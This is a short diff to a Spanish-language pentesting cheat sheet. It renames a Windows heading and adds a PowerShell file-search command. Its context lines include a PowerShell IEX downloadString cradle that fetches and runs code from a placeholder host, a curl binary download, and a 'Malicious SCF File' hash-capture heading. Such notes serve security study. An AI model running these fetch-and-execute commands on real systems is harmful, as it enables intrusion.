@@ -336,7 +336,7 @@ export SHELL=bash
 ```
 # Windows
 
-## Powershell
+## Comandos útiles
 
 Descargar binarios
 ```
@@ -345,6 +345,12 @@ powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/binario.
 ```
 curl "http://IP/binario" -o binario
 ```
+
+Buscar archivo
+```
+Get-Childitem C:\ -Include nombre_archivo -File -Recurse
+```
+
 ## Hashes
 
 Malicious SCF File
